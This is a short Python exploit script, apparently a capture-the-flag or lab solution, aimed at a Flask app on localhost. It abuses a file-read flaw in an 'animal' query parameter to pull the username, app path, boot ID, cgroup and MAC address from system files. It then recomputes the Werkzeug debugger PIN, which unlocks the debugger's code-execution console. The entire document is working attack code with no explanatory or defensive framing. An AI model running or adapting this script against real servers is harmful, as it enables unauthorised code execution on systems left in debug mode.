import hashlib
from itertools import chain
import requests

# https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug
# https://github.com/pallets/werkzeug/blob/6eebdb83b8a57027ee0c4f1b0698877d9bc6b038/src/werkzeug/debug/__init__.py#L41

r = requests.get("http://localhost:5000?animal=")
username = r.text[r.text.index('/home/') + len('/home/'):].split('/')[0]
print('username:', username)
path = r.text[r.text.index('/usr/local'):].split('.py')[0] + '.py'
print('path:', path)

r = requests.get("http://localhost:5000?animal=/proc/sys/kernel/random/boot_id")
machine_id = r.text.split('quote>')[1].split('</block')[0].strip() or None

r = requests.get("http://localhost:5000?animal=/proc/self/cgroup")
machine_id += r.text.split('quote>')[1].split('</block')[0].split('\n')[0].strip().rpartition("/")[2]
print('machine_id:', machine_id)


# r = requests.get("http://localhost:5000?animal=/proc/net/arp") # to find eth0

r = requests.get("http://localhost:5000?animal=/sys/class/net/eth0/address")
address = r.text.split('quote>')[1].split('</block')[0]
address = str(int(''.join(''.join(address.split(':')).split()), 16))
print('address:', address)

probably_public_bits = [
    username,  # username
    "flask.app",  # modname
    "Flask",  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    path,  # getattr(mod, '__file__', None),
]

private_bits = [
    address,  # str(uuid.getnode()),  /sys/class/net/ens33/address
    machine_id,  # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print('Flask Debug Pin:', rv)
